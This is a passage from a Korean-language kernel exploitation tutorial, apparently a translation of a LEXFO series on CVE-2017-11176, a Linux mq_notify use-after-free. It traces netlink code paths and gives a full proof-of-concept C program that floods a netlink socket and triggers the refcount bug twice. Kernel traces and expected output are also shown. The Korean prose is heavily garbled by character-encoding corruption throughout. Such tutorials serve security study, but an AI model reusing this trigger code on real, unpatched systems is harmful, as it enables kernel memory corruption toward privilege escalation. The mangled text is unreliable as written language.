* **msg->msg\_iov->iov\_base**ê°€ ì½ê¸° ê°€ëŠ¥í•œ ìœ ì € ì˜ì—­ì˜ ì£¼ì†Œì´ë‹¤

ì—¬ê¸°ì„œ ì»¤ë„ ìµìŠ¤í”Œë¡œì‡ì„ í•  ë•Œì˜ ì˜ë¬´ë¥¼ ì•Œ ìˆ˜ ìˆë‹¤. ê°ê°ì˜ ê²€ì‚¬ë¥¼ ë¶„ì„, íŠ¹ì • ì»¤ë„ ê²½ë¡œ ê°•ì œ, syscall íŒŒë¼ë¯¸í„° ë§ì¶”ê¸°(tailor) ë“±. ì‘ì„±í•˜ê¸°ì— ë„ˆë¬´ ê¸´ ëª©ë¡ë„ ì•„ë‹ˆë‹¤. ëª‡ ëª‡ ê²½ë¡œë“¤ì€ ì´ë³´ë‹¤ í›¨ì”¬ ë³µì¡í•˜ë‹¤.

ì´ì œ ë„˜ì–´ê°€ì„œ netlink\_attachskb()ì— ë„ë‹¬í•´ë³´ì.

## Reach netlink\_attachskb() from netlink\_unicast()

ì´ë²ˆ ë‚´ìš©ì€ ì´ì „ ê²ƒë³´ë‹¤ ì‰½ë‹¤. netlink\_unicast()ëŠ” ë‹¤ìŒ íŒŒë¼ë¯¸í„°ë¥¼ í†µí•´ í˜¸ì¶œëœë‹¤:

```c
netlink_unicast(sk, skb, dst_pid, msg->msg_flags&MSG_DONTWAIT);
```

ê°ê°ì˜ íŒŒë¼ë¯¸í„°ì˜ ì˜ë¯¸ëŠ” ë‹¤ìŒê³¼ ê°™ë‹¤:

* **sk**ëŠ” ìš°ë¦¬ì˜ ì†¡ì‹ ì netlink\_sockì´ë‹¤
* **skb**ëŠ” ì†Œì¼“ ë²„í¼ì¸ë° *msg->msg\_iov->iov\_len* í¬ê¸°ì˜ *msg->msg\_iov->iov\_base* ë°ì´í„°ë¡œ ê°€ë“ ì°¨ìˆë‹¤.
* **dst\_pid**ëŠ” ìš°ë¦¬ì˜ ìˆ˜ì‹ ì netlink ì†Œì¼“ì„ ê°€ë¦¬í‚¤ëŠ” ì œì–´ëœ pid(*msg->msg\_name->nl\_pid*)ì´ë‹¤.
* **msg->msg\_flasg&MSG\_DONTWAIT**ì€ netlink\_unicastê°€ blockì—¬ë¶€ë¥¼ ë‚˜íƒ€ë‚¸ë‹¤.

**ì£¼ì˜**: netlink\_unicast() ì½”ë“œì˜ **"ssk"ëŠ” ì†¡ì‹ ì ì†Œì¼“ì´ê³  "sk"ëŠ” ìˆ˜ì‹ ì ì†Œì¼“ì´ë‹¤**.

netlink\_unicst() ì½”ë“œëŠ” ë‹¤ìŒê³¼ ê°™ë‹¤:

```c
    int netlink_unicast(struct sock *ssk, struct sk_buff *skb,
            u32 pid, int nonblock)
    {
      struct sock *sk;
      int err;
      long timeo;

      skb = netlink_trim(skb, gfp_any());   // <----- ignore this

[0]   timeo = sock_sndtimeo(ssk, nonblock);
    retry:
[1]   sk = netlink_getsockbypid(ssk, pid);
      if (IS_ERR(sk)) {
        kfree_skb(skb);
        return PTR_ERR(sk);
      }
[2]   if (netlink_is_kernel(sk))
        return netlink_unicast_kernel(sk, skb, ssk);

[3]   if (sk_filter(sk, skb)) {
        err = skb->len;
        kfree_skb(skb);
        sock_put(sk);
        return err;
      }

[4]   err = netlink_attachskb(sk, skb, &timeo, ssk);
      if (err == 1)
        goto retry;
      if (err)
        return err;

[5]   return netlink_sendskb(sk, skb);
    }
```

[0]ì—ì„œ sock\_sndtimeo()ê°€ **timeo** (timeout)ì˜ ê°’ì„ *nonblock* íŒŒë¼ë¯¸í„°ì— ë”°ë¼ ì„¤ì •í•œë‹¤. ìš°ë¦° blockì„ ì›í•˜ì§€ ì•Šê¸° ë•Œë¬¸ì—(nonblock >0), timeoëŠ” 0ì´ ë  ê²ƒì´ë‹¤. ì¦‰ **msg->msg\_flagsëŠ” MSG\_DONTWAIT í”Œë˜ê·¸ë¥¼ ì„¤ì •í•´ì•¼ í•œë‹¤**.

[1]ì—ì„œ ëª©ì ì§€ netlink\_sock "sk"ê°€ pidë¥¼ í†µí•´ ì–»ì–´ì§„ë‹¤. ë‹¤ìŒ ì„¹ì…˜ì—ì„œ ë³´ê²Œ ë˜ê² ì§€ë§Œ **ëª©ì ì§€ netlink\_socket**ì€ netlink\_getsockbypid()ì— ì˜í•´ ì–»ì–´ì§€ê¸° ì „ì— **boundë˜ì–´ì•¼ í•œë‹¤**.

[2]ì—ì„œ ëª©ì ì§€ ì†Œì¼“ì´ "ì»¤ë„" ì†Œì¼“ì´ë©´ ì•ˆ ëœë‹¤. netlink ì†Œì¼“ì€ *NETLINK\_KERNEL\_SOCKET* í”Œë˜ê·¸ê°€ ìˆìœ¼ë©´ *kernel* ì†Œì¼“ìœ¼ë¡œ ì·¨ê¸‰(tag)ëœë‹¤. ì´ëŠ” ì†Œì¼“ì´ netlink\_kernel\_create() í•¨ìˆ˜ë¥¼ í†µí•´ ìƒì„±ë˜ì—ˆë‹¤ëŠ” ì˜ë¯¸ì´ë‹¤. ì•ˆíƒ€ê¹ê²Œë„ (í˜„ì¬ ìµìŠ¤í”Œë¡œì‡ì˜) *NETLINK\_GENERIC* ë˜í•œ ê·¸ ì¤‘ í•˜ë‚˜ë‹¤. ê·¸ëŸ¼ ì´ì œ **ìˆ˜ì‹ ì ì†Œì¼“ì˜ í”„ë¡œí† ì½œë„ NETLINK\_USERSOCKìœ¼ë¡œ ë°”ê¿”ë³´ì**. ì–´ì°Œ ëë“  ë” ì˜ë¯¸ê°€ ìˆê¸´ í•˜ë‹¤(?). ìˆ˜ì‹ ì netlink\_sockì— ì°¸ì¡°ê°€ ì´ë£¨ì–´ì§„ë‹¤ëŠ” ê±¸ ê¸°ì–µí•˜ì.

[3]ì—ì„œ BPF sock filterê°€ ì ìš©ë˜ì–´ ìˆì„ ê²ƒì´ë‹¤. **ìˆ˜ì‹ ì sockì— ì•„ë¬´ëŸ° BPF filterë„ ìƒì„±í•˜ì§€ ì•Šìœ¼ë©´** í†µê³¼ëœë‹¤.

ê·¸ë¦¬ê³  [4]ì—ì„œ netlink\_attachskb()ë¥¼ í˜¸ì¶œí•œë‹¤! netlink\_attachskb() ì•ˆì—ì„œ, ë‹¤ìŒ ë‘ ê²½ë¡œ ì¤‘ í•˜ë‚˜ë¡œ ê°€ê²Œ ëœë‹¤(ì½”ë“œë¥¼ ë‹¤ì‹œ ì²¨ë¶€í•˜ì§„ ì•Šê² ë‹¤):

1. ìˆ˜ì‹ ì ë²„í¼ê°€ ê½‰ ì°¨ìˆì§€ ì•ŠìŒ: skb\_set\_owner\_r()ì„ í˜¸ì¶œí•˜ì—¬ sk\_rmem\_allocì„ ì¦ê°€ì‹œí‚¨ë‹¤
2. ìˆ˜ì‹ ì ë²„í¼ê°€ ê½‰ ì°¨ìˆìŒ: netlink\_attachskb()ê°€ blockí•˜ì§€ ì•Šê³  -EAGAINì„ ë°˜í™˜í•œë‹¤(?) (timeout is zero)

**ì¦‰, ìš°ë¦¬ëŠ” ì–¸ì œ ìˆ˜ì‹ ì ë²„í¼ê°€ ê½‰ ì°¨ìˆëŠ”ì§€ ì•Œ ë°©ë²•ì´ ìƒê²¼ë‹¤. ê·¸ëƒ¥ sendmsg()ì˜ ì—ëŸ¬ ì½”ë“œë¥¼ í™•ì¸í•˜ë©´ ëœë‹¤.**

ë§ˆì§€ë§‰ìœ¼ë¡œ, [5]ì˜ netlink\_sendskb() í˜¸ì¶œì€ skbë¥¼ ìˆ˜ì‹ ì ë²„í¼ ë¦¬ìŠ¤íŠ¸ì— ë¶™ì´ê³  netlink\_getsockbypid()ê°€ í–ˆë˜ ì°¸ì¡°ë¥¼ í•´ì œí•œë‹¤. ì•¼í˜¸!ğŸ˜Š

ì œì•½ ë¦¬ìŠ¤íŠ¸ë¥¼ ê°±ì‹ í•´ë³´ì:

* **msg->msg\_flags**ì˜ MSG\_DONTWAIT í”Œë˜ê·¸ê°€ ì„¤ì •ë¨
* ìˆ˜ì‹ ì netlink ì†Œì¼“ì´ sendmsg() í˜¸ì¶œ ì „ì— bindë˜ì–´ì•¼ í•¨
* ìˆ˜ì‹ ì netlnk ì†Œì¼“ì´ ë¬´ì¡°ê±´ **NETLINK\_USERSOCK** í”„ë¡œí† ì½œì„ ìƒë‡½í•´ì•¼ í•¨
* ìˆ˜ì‹ ì ì†Œì¼“ì— ì–´ë–¤ BPF filterë„ ì •ì˜í•˜ë©´ ì•ˆ ë¨

ì´ì œ ìµœì¢… PoC ì½”ë“œì— ê±°ì˜ ë‹¤ ì™”ë‹¤. ìˆ˜ì‹ ì ì†Œì¼“ì„ bindí•˜ê¸°ë§Œ í•˜ë©´ ëœë‹¤.

## Binding the receiver socket

ë‹¤ë¥¸ ì–´ë–¤ ì†Œì¼“ í†µì‹ ê³¼ ë§ˆì°¬ê°€ì§€ë¡œ ë‘ ì†Œì¼“ì€ "ì£¼ì†Œ"ë¥¼ ì´ìš©í•˜ì—¬ í†µì‹ í•  ìˆ˜ ìˆë‹¤. netlink ì†Œì¼“ì—ì„œëŠ” "struct sockaadr\_nl" íƒ€ì…ì„ ì‚¬ìš©í•œë‹¤(ë§¤ë‰´ì–¼ ì°¸ê³ ):

```c
struct sockaddr_nl {
   sa_family_t     nl_family;  /* AF_NETLINK */
   unsigned short  nl_pad;     /* Zero. */
   pid_t           nl_pid;     /* Port ID. */
   __u32           nl_groups;  /* Multicast groups mask. */
};
```

"broadcast group"ì— ì†í•˜ê³  ì‹¶ì§€ ì•Šìœ¼ë¯€ë¡œ, *nl\_groups*ê°€ 0ì´ì–´ì•¼ í•œë‹¤. ì—¬ê¸°ì„œ ì¤‘ìš”í•œ ìœ ì¼í•œ í•„ë“œëŠ” "nl\_pid"ì´ë‹¤.

ê¸°ë³¸ì ìœ¼ë¡œ **netlink\_bind()**ëŠ” ë‘ ê²½ë¡œë¡œ ê°ˆ ìˆ˜ ìˆë‹¤:

1. nl\_pidê°€ 0ì´ ì•„ë‹Œ ê²½ìš°: **netlink\_insert()**ë¥¼ í˜¸ì¶œ
2. nl\_pidê°€ 0ì¸ ê²½ìš°: **netlink\_autobind()**ë¥¼ í˜¸ì¶œí•˜ì—¬ ê²°êµ­ netlink\_insert() í˜¸ì¶œ

ì´ë¯¸ ì‚¬ìš©ëœ *pid*ë¥¼ í†µí•´ netlink\_insert()ë¥¼ í˜¸ì¶œí•˜ë©´ "-EADDRINUSE" ì—ëŸ¬ê°€ ë°œìƒí•˜ë©° ì‹¤íŒ¨í•œë‹¤. ê·¸ë ‡ì§€ ì•Šìœ¼ë©´ *nl\_pid*ì™€ netlink sock ì‚¬ì´ì˜ ë§¤í•‘ì´ ìƒê¸´ë‹¤. ì¦‰ netlink\_getsockbypid()ë¥¼ í†µí•´ netlink\_sockì„ ì–»ì„ ìˆ˜ ìˆë‹¤. ê²Œë‹¤ê°€, **netlink\_insert()ëŠ” sockì˜ ë ˆí¼ëŸ°ìŠ¤ ì¹´ìš´í„°ë¥¼ 1 ì¦ê°€ì‹œí‚¨ë‹¤**. ìµœì¢… proof-of-concept ì½”ë“œë¥¼ ìœ„í•´ ê¸°ì–µí•´ë‘ì.

**ë…¸íŠ¸**: netlinkê°€ "pid:netlink\_sock" ë§¤í•‘ì„ ì €ì¥í•˜ëŠ” ë°©ë²•ì€ [part 4](https://chamalane.herokuapp.com/posts/5d50360ac040080004228198)ì—ì„œ ë” ê¹Šê²Œ ë‹¤ë£° ê²ƒì´ë‹¤.

netlink\_autobind()ë¥¼ í˜¸ì¶œí•˜ëŠ” ê²ƒì´ ë” ìì—°ìŠ¤ëŸ¬ì›Œ ë³´ì´ì§€ë§Œ ìš°ë¦° ìœ ì € ì˜ì—­ì—ì„œ bind()ê°€ ì„±ê³µí•  ë•Œê¹Œì§€ pid ê°’ì„ ë¸Œë£¨íŠ¸í¬ì‹±í•˜ëŠ” *ì‹œë®¬ë ˆì´ì…˜*ì„ í•œë‹¤. ê·¸ë ‡ê²Œ í•˜ë©´ getsockname()ì„ í˜¸ì¶œí•˜ì§€ ì•Šê³ ë„ ëª©ì ì§€ nl\_pid ê°’ì„ ê°€ì§ˆ ìˆ˜ ìˆê³ , (ì•„ë§ˆë„) ë””ë²„ê¹…ì´ ë” ì‰¬ì›Œì§„ë‹¤(í™•ì‹¤í•˜ì§„ ì•Šë‹¤ğŸ™„).

## Putting it All Together

ì´ ëª¨ë“  ê²½ë¡œë¥¼ ì§€ë‚˜ì˜¤ê¸°ê¹Œì§€ ì˜¤ë˜ ê±¸ë ¸ë‹¤. ì´ì œ ìµìŠ¤í”Œë¡œì‡ì„ êµ¬í˜„í•˜ê³  ìš°ë¦¬ì˜ ì²« ëª©í‘œ: **netlink\_attachskb()ê°€ 1ì„ ë°˜í™˜í•˜ê²Œ ë§Œë“¤ê¸°**ì— ë„ë‹¬í•  ì¤€ë¹„ê°€ ë˜ì—ˆë‹¤!

ì „ëµì€ ë‹¤ìŒê³¼ ê°™ë‹¤:

1. NETLINK\_USERSOCK í”„ë¡œí† ì½œì„ ì‚¬ìš©í•˜ëŠ” AF\_NETLINK ì†Œì¼“ì„ ë‘˜ ìƒì„±í•œë‹¤.
2. íƒ€ê²Ÿ(ìˆ˜ì‹ ì) ì†Œì¼“ì„ bindí•œë‹¤(= receiver bufferê°€ ê°€ë“ ì°¨ìˆì–´ì•¼ í•¨).
3. [ì„ íƒ] íƒ€ê²Ÿ ì†Œì¼“ì˜ receive bufferë¥¼ ì¤„ì—¬ë³¸ë‹¤ (sendmsg()ë¥¼ ëœ í˜¸ì¶œí•´ë„ ë¨).
4. ì†¡ì‹ ì ì†Œì¼“ì—ì„œ íƒ€ê²Ÿ ì†Œì¼“ì— *sendmsg()*ë¥¼ ê³„ì† ë³´ë‚´ì„œ EAGAINì„ ë°˜í™˜í•˜ê²Œ í•œë‹¤.
5. ì†¡ì‹ ì ì†Œì¼“ì„ ëˆë‹¤(close). (ë”ì´ìƒ í•„ìš” ì—†ìŒ)

ëª¨ë“  ê²ƒì´ ì˜ ëŒì•„ê°€ëŠ”ì§€ ê²€ì¦í•˜ê¸° ìœ„í•´ ë‹¤ìŒ *ë…ë¦½ëœ*(standalone) ì½”ë“œë¥¼ ëŒë ¤ë³¼ ìˆ˜ ìˆë‹¤:

```c
static int prepare_blocking_socket(void)
{
  int send_fd;
  int recv_fd;
  char buf[1024*10]; // should be less than (sk->sk_sndbuf - 32), you can use getsockopt()
  int new_size = 0; // this will be reset to SOCK_MIN_RCVBUF

  struct sockaddr_nl addr = {
    .nl_family = AF_NETLINK,
    .nl_pad = 0,
    .nl_pid = 118, // must different than zero
    .nl_groups = 0 // no groups
  };

  struct iovec iov = {
    .iov_base = buf,
    .iov_len = sizeof(buf)
  };

  struct msghdr mhdr = {
    .msg_name = &addr,
    .msg_namelen = sizeof(addr),
    .msg_iov = &iov,
    .msg_iovlen = 1,
    .msg_control = NULL,
    .msg_controllen = 0,
    .msg_flags = 0, 
  };

  printf("[ ] preparing blocking netlink socket\n");

  if ((send_fd = _socket(AF_NETLINK, SOCK_DGRAM, NETLINK_USERSOCK)) < 0 ||
      (recv_fd = _socket(AF_NETLINK, SOCK_DGRAM, NETLINK_USERSOCK)) < 0)
  {
    perror("socket");
    goto fail;
  }
  printf("[+] socket created (send_fd = %d, recv_fd = %d)\n", send_fd, recv_fd);

  // simulate netlink_autobind()
  while (_bind(recv_fd, (struct sockaddr*)&addr, sizeof(addr)))
  {
    if (errno != EADDRINUSE)
    {
      perror("[-] bind");
      goto fail;
    }
    addr.nl_pid++;
  }

  printf("[+] netlink socket bound (nl_pid=%d)\n", addr.nl_pid);

  if (_setsockopt(recv_fd, SOL_SOCKET, SO_RCVBUF, &new_size, sizeof(new_size)))
    perror("[-] setsockopt"); // no worry if it fails, it is just an optim.
  else
    printf("[+] receive buffer reduced\n");

  printf("[ ] flooding socket\n");
  while (_sendmsg(send_fd, &mhdr, MSG_DONTWAIT) > 0)  // <----- don't forget MSG_DONTWAIT
    ;
  if (errno != EAGAIN)  // <----- did we failed because the receive buffer is full ?
  {
    perror("[-] sendmsg");
    goto fail;
  }
  printf("[+] flood completed\n");

  _close(send_fd);

  printf("[+] blocking socket ready\n");
  return recv_fd;

fail:
  printf("[-] failed to prepare block socket\n");
  return -1;
}
```

ê²°ê³¼ë¥¼ system tapìœ¼ë¡œ í™•ì¸í•´ë³´ì. **ì—¬ê¸°ì„œë¶€í„° system tapì€ ì»¤ë„ì„ ê´€ì°°í•˜ëŠ” ë°ë§Œ ì“°ì¸ë‹¤. ì»¤ë„ ìˆ˜ì •ì— ì´ìš©í•˜ì§€ ì•ŠëŠ”ë‹¤.** socketì„ *congested*ë¡œ ë§ˆí‚¹í–ˆë˜ ë¶€ë¶„ì„ ì§€ìš°ëŠ” ê²ƒì„ ìŠì§€ ë§ì. ì´ì œ êµ¬ë™í•´ë³´ì:

```plaintext
(2768-2768) [SYSCALL] ==>> sendmsg (3, 0x7ffe69f94b50, MSG_DONTWAIT)
(2768-2768) [uland] ==>> copy_from_user ()
(2768-2768) [uland] ==>> copy_from_user ()
(2768-2768) [uland] ==>> copy_from_user ()
(2768-2768) [netlink] ==>> netlink_sendmsg (kiocb=0xffff880006137bb8 sock=0xffff88002fdba0c0 msg=0xffff880006137f18 len=0x2800)
(socket=0xffff88002fdba0c0)->sk->sk_refcnt = 1
(2768-2768) [netlink] ==>> netlink_autobind (sock=0xffff88002fdba0c0)
(2768-2768) [netlink] <<== netlink_autobind = 0
(2768-2768) [skb] ==>> alloc_skb (priority=0xd0 size=?)
(2768-2768) [skb] ==>> skb_put (skb=0xffff88003d298840 len=0x2800)
(2768-2768) [skb] <<== skb_put = ffff880006150000
(2768-2768) [iovec] ==>> memcpy_fromiovec (kdata=0xffff880006150000 iov=0xffff880006137da8 len=0x2800)
(2768-2768) [uland] ==>> copy_from_user ()
(2768-2768) [iovec] <<== memcpy_fromiovec = 0
(2768-2768) [netlink] ==>> netlink_unicast (ssk=0xffff880006173c00 skb=0xffff88003d298840 pid=0x76 nonblock=0x40)
(2768-2768) [netlink] ==>> netlink_lookup (pid=? protocol=? net=?)
(2768-2768) [sk] ==>> sk_filter (sk=0xffff88002f89ac00 skb=0xffff88003d298840)
(2768-2768) [sk] <<== sk_filter = 0
(2768-2768) [netlink] ==>> netlink_attachskb (sk=0xffff88002f89ac00 skb=0xffff88003d298840 timeo=0xffff880006137ae0 ssk=0xffff880006173c00)
-={ dump_netlink_sock: 0xffff88002f89ac00 }=-
- sk = 0xffff88002f89ac00
- sk->sk_rmem_alloc = 0                               // <-----
- sk->sk_rcvbuf = 2312                                // <-----
- sk->sk_refcnt = 3
- nlk->state = 0
- sk->sk_flags = 100
-={ dump_netlink_sock: END}=-
(2768-2768) [netlink] <<== netlink_attachskb = 0
-={ dump_netlink_sock: 0xffff88002f89ac00 }=-
- sk = 0xffff88002f89ac00
- sk->sk_rmem_alloc = 10504                           // <-----
- sk->sk_rcvbuf = 2312                                // <-----
- sk->sk_refcnt = 3
- nlk->state = 0
- sk->sk_flags = 100
-={ dump_netlink_sock: END}=-
(2768-2768) [netlink] <<== netlink_unicast = 2800
(2768-2768) [netlink] <<== netlink_sendmsg = 2800
(2768-2768) [SYSCALL] <<== sendmsg= 10240
```

**í›Œë¥­í•˜ë‹¤! ì´ì œ "receive buffer full" ì¡°ê±´ì„ ë§Œì¡±ì‹œì¼°ë‹¤(*sk\_rmem\_alloc > sk\_rcvbuf*). ì¦‰ *mq\_attachskb()*ì— ëŒ€í•œ ë‹¤ìŒ í˜¸ì¶œì´ 1ì„ ë°˜í™˜í•  ê²ƒì´ë‹¤!**

í•  ì¼ ëª©ë¡ì„ ê°±ì‹ í•´ë³´ì:

1. [í•´ê²°] netlink\_attachskb()ê°€ 1ì„ ë°˜í™˜í•˜ê²Œ ë§Œë“¤ê¸°
2. [í•´ê²°] ìµìŠ¤í”Œë¡œì‡ ìŠ¤ë ˆë“œ unblockí•˜ê¸°
3. [í•´ê²°] ë‘ ë²ˆì§¸ fget() í˜¸ì¶œì´ NULLì„ ë°˜í™˜í•˜ê²Œ ë§Œë“¤ê¸°

ê±°ì˜ ë‹¤ ëë‚¬ë‹¤.

- - -

# <a name='final-poc-code'></a>Final Proof-Of-Concept Code

ë§ˆì§€ë§‰ ì„¸ ì„¹ì…˜ì—ì„œ *ìœ ì € ì˜ì—­ ì½”ë“œ*ë§Œì„ ì´ìš©í•˜ì—¬ ë²„ê·¸ë¥¼ íŠ¸ë¦¬ê±°í•˜ëŠ”ë° í•„ìš”í•œ ëª¨ë“  ì¡°ê±´ì„ êµ¬í˜„í–ˆë‹¤. ìµœì¢… *proof-of-concept* ì½”ë“œë¥¼ ë³´ê¸° ì „ì— **í•œ ê°€ì§€ ë” í•´ì•¼ í•  ì¼**ì´ ìˆë‹¤.

receive bufferë¥¼ ì±„ìš¸ ë•Œ netlink\_bind() ë„ì¤‘ netlink\_insert()ì— ì˜í•˜ì—¬ ë ˆí¼ëŸ°ìŠ¤ ì¹´ìš´í„°ê°€ í•˜ë‚˜ ì¦ê°€í•˜ëŠ” ê²ƒì„ ë³´ì•˜ë‹¤. ì´ëŠ” *mq\_notify()*ì— ë“¤ì–´ê°€ê¸° *ì „ì—* ë ˆí¼ëŸ°ìŠ¤ ì¹´ìš´í„°ê°€ (1ì´ ì•„ë‹Œ) 2ê°€ ëœë‹¤ëŠ” ëœ»ì´ë‹¤.

ë²„ê·¸ê°€ netlink\_sockì˜ ë ˆí¼ëŸ°ìŠ¤ ì¹´ìš´í„°ë¥¼ 1 ê°ì†Œì‹œí‚¤ëŠ” *primitive*ë¥¼ ì¤¬ìœ¼ë¯€ë¡œ **ë²„ê·¸ë¥¼ ë‘ ë²ˆ íŠ¸ë¦¬ê±°í•´ì•¼ í•œë‹¤**!

ë²„ê·¸ë¥¼ íŠ¸ë¦¬ê±°í•˜ê¸° ì „ì— ë©”ì¸ ìŠ¤ë ˆë“œë¥¼ unblockí•˜ë ¤ê³  *dup()*ë¥¼ ì‚¬ìš©í–ˆì—ˆë‹¤. ê·¸ê²ƒì„ ë‹¤ì‹œ ì‚¬ìš©í•´ì„œ í•œ fdëŠ” unblockì— ë‹¤ë¥¸ fdëŠ” ë²„ê·¸ë¥¼ íŠ¸ë¦¬ê±°í•˜ëŠ”ë° ì‚¬ìš©í•  ê²ƒì´ë‹¤(?).

**"*ì•Œê² ìœ¼ë‹ˆê¹Œ ì½”ë“œë¥¼ ë³´ì—¬ì¤˜!*"**

ë‹¤ìŒ ì½”ë“œê°€ ìµœì¢… PoC ì½”ë“œë‹¤(system tapì„ êµ¬ë™í•˜ì§€ ë§ ê²ƒ):

```c
/*
 * CVE-2017-11176 Proof-of-concept code by LEXFO.
 *
 * Compile with:
 *
 *  gcc -fpic -O0 -std=c99 -Wall -pthread exploit.c -o exploit
 */

#define _GNU_SOURCE
#include <asm/types.h>
#include <mqueue.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <linux/netlink.h>
#include <pthread.h>
#include <errno.h>
#include <stdbool.h>

// ============================================================================
// ----------------------------------------------------------------------------
// ============================================================================

#define NOTIFY_COOKIE_LEN (32)
#define SOL_NETLINK (270) // from [include/linux/socket.h]

// ----------------------------------------------------------------------------

// avoid library wrappers
#define _mq_notify(mqdes, sevp) syscall(__NR_mq_notify, mqdes, sevp)
#define _socket(domain, type, protocol) syscall(__NR_socket, domain, type, protocol)
#define _setsockopt(sockfd, level, optname, optval, optlen) \
  syscall(__NR_setsockopt, sockfd, level, optname, optval, optlen)
#define _getsockopt(sockfd, level, optname, optval, optlen) \
  syscall(__NR_getsockopt, sockfd, level, optname, optval, optlen)
#define _dup(oldfd) syscall(__NR_dup, oldfd)
#define _close(fd) syscall(__NR_close, fd)
#define _sendmsg(sockfd, msg, flags) syscall(__NR_sendmsg, sockfd, msg, flags)
#define _bind(sockfd, addr, addrlen) syscall(__NR_bind, sockfd, addr, addrlen)

// ----------------------------------------------------------------------------

#define PRESS_KEY() \
  do { printf("[ ] press key to continue...\n"); getchar(); } while(0)

// ============================================================================
// ----------------------------------------------------------------------------
// ============================================================================

struct unblock_thread_arg
{
  int sock_fd;
  int unblock_fd;
  bool is_ready; // we can use pthread barrier instead
};

// ----------------------------------------------------------------------------

static void* unblock_thread(void *arg)
{
  struct unblock_thread_arg *uta = (struct unblock_thread_arg*) arg;
  int val = 3535; // need to be different than zero

  // notify the main thread that the unblock thread has been created. It *must*
  // directly call mq_notify().
  uta->is_ready = true; 

  sleep(5); // gives some time for the main thread to block

  printf("[ ][unblock] closing %d fd\n", uta->sock_fd);
  _close(uta->sock_fd);

  printf("[ ][unblock] unblocking now\n");
  if (_setsockopt(uta->unblock_fd, SOL_NETLINK, NETLINK_NO_ENOBUFS, &val, sizeof(val)))
    perror("[+] setsockopt");
  return NULL;
}

// ----------------------------------------------------------------------------

static int decrease_sock_refcounter(int sock_fd, int unblock_fd)
{
  pthread_t tid;
  struct sigevent sigev;
  struct unblock_thread_arg uta;
  char sival_buffer[NOTIFY_COOKIE_LEN];

  // initialize the unblock thread arguments
  uta.sock_fd = sock_fd;
  uta.unblock_fd = unblock_fd;
  uta.is_ready = false;

  // initialize the sigevent structure
  memset(&sigev, 0, sizeof(sigev));
  sigev.sigev_notify = SIGEV_THREAD;
  sigev.sigev_value.sival_ptr = sival_buffer;
  sigev.sigev_signo = uta.sock_fd;

  printf("[ ] creating unblock thread...\n");
  if ((errno = pthread_create(&tid, NULL, unblock_thread, &uta)) != 0)
  {
    perror("[-] pthread_create");
    goto fail;
  }
  while (uta.is_ready == false) // spinlock until thread is created
    ;
  printf("[+] unblocking thread has been created!\n");

  printf("[ ] get ready to block\n");
  if ((_mq_notify((mqd_t)-1, &sigev) != -1) || (errno != EBADF))
  {
    perror("[-] mq_notify");
    goto fail;
  }
  printf("[+] mq_notify succeed\n");

  return 0;

fail:
  return -1;
}

// ============================================================================
// ----------------------------------------------------------------------------
// ============================================================================

/*
 * Creates a netlink socket and fills its receive buffer.
 *
 * Returns the socket file descriptor or -1 on error.
 */

static int prepare_blocking_socket(void)
{
  int send_fd;
  int recv_fd;
  char buf[1024*10];
  int new_size = 0; // this will be reset to SOCK_MIN_RCVBUF

  struct sockaddr_nl addr = {
    .nl_family = AF_NETLINK,
    .nl_pad = 0,
    .nl_pid = 118, // must different than zero
    .nl_groups = 0 // no groups
  };

  struct iovec iov = {
    .iov_base = buf,
    .iov_len = sizeof(buf)
  };

  struct msghdr mhdr = {
    .msg_name = &addr,
    .msg_namelen = sizeof(addr),
    .msg_iov = &iov,
    .msg_iovlen = 1,
    .msg_control = NULL,
    .msg_controllen = 0,
    .msg_flags = 0, 
  };

  printf("[ ] preparing blocking netlink socket\n");

  if ((send_fd = _socket(AF_NETLINK, SOCK_DGRAM, NETLINK_USERSOCK)) < 0 ||
      (recv_fd = _socket(AF_NETLINK, SOCK_DGRAM, NETLINK_USERSOCK)) < 0)
  {
    perror("socket");
    goto fail;
  }
  printf("[+] socket created (send_fd = %d, recv_fd = %d)\n", send_fd, recv_fd);

  while (_bind(recv_fd, (struct sockaddr*)&addr, sizeof(addr)))
  {
    if (errno != EADDRINUSE)
    {
      perror("[-] bind");
      goto fail;
    }
    addr.nl_pid++;
  }

  printf("[+] netlink socket bound (nl_pid=%d)\n", addr.nl_pid);

  if (_setsockopt(recv_fd, SOL_SOCKET, SO_RCVBUF, &new_size, sizeof(new_size)))
    perror("[-] setsockopt"); // no worry if it fails, it is just an optim.
  else
    printf("[+] receive buffer reduced\n");

  printf("[ ] flooding socket\n");
  while (_sendmsg(send_fd, &mhdr, MSG_DONTWAIT) > 0)
    ;
  if (errno != EAGAIN)
  {
    perror("[-] sendmsg");
    goto fail;
  }
  printf("[+] flood completed\n");

  _close(send_fd);

  printf("[+] blocking socket ready\n");
  return recv_fd;

fail:
  printf("[-] failed to prepare block socket\n");
  return -1;
}

// ============================================================================
// ----------------------------------------------------------------------------
// ============================================================================

int main(void)
{
  int sock_fd  = -1;
  int sock_fd2 = -1;
  int unblock_fd = 1;

  printf("[ ] -={ CVE-2017-11176 Exploit }=-\n");

  if ((sock_fd = prepare_blocking_socket()) < 0)
    goto fail;
  printf("[+] netlink socket created = %d\n", sock_fd);

  if (((unblock_fd = _dup(sock_fd)) < 0) || ((sock_fd2 = _dup(sock_fd)) < 0))
  {
    perror("[-] dup");
    goto fail;
  }
  printf("[+] netlink fd duplicated (unblock_fd=%d, sock_fd2=%d)\n", unblock_fd, sock_fd2);

  // trigger the bug twice
  if (decrease_sock_refcounter(sock_fd, unblock_fd) ||
      decrease_sock_refcounter(sock_fd2, unblock_fd))
  {
    goto fail;
  }

  printf("[ ] ready to crash?\n");
  PRESS_KEY();

  // TODO: exploit

  return 0;

fail:
  printf("[-] exploit failed!\n");
  PRESS_KEY();
  return -1;
}

// ============================================================================
// ----------------------------------------------------------------------------
// ============================================================================
```

ë‹¤ìŒì€ ì˜ˆìƒë˜ëŠ” ê²°ê³¼ì´ë‹¤:

```plaintext
[ ] -={ CVE-2017-11176 Exploit }=-
[ ] preparing blocking netlink socket
[+] socket created (send_fd = 3, recv_fd = 4)
[+] netlink socket bound (nl_pid=118)
[+] receive buffer reduced
[ ] flooding socket
[+] flood completed
[+] blocking socket ready
[+] netlink socket created = 4
[+] netlink fd duplicated (unblock_fd=3, sock_fd2=5)
[ ] creating unblock thread...
[+] unblocking thread has been created!
[ ] get ready to block
[ ][unblock] closing 4 fd
[ ][unblock] unblocking now
[+] mq_notify succeed
[ ] creating unblock thread...
[+] unblocking thread has been created!
[ ] get ready to block
[ ][unblock] closing 5 fd
[ ][unblock] unblocking now
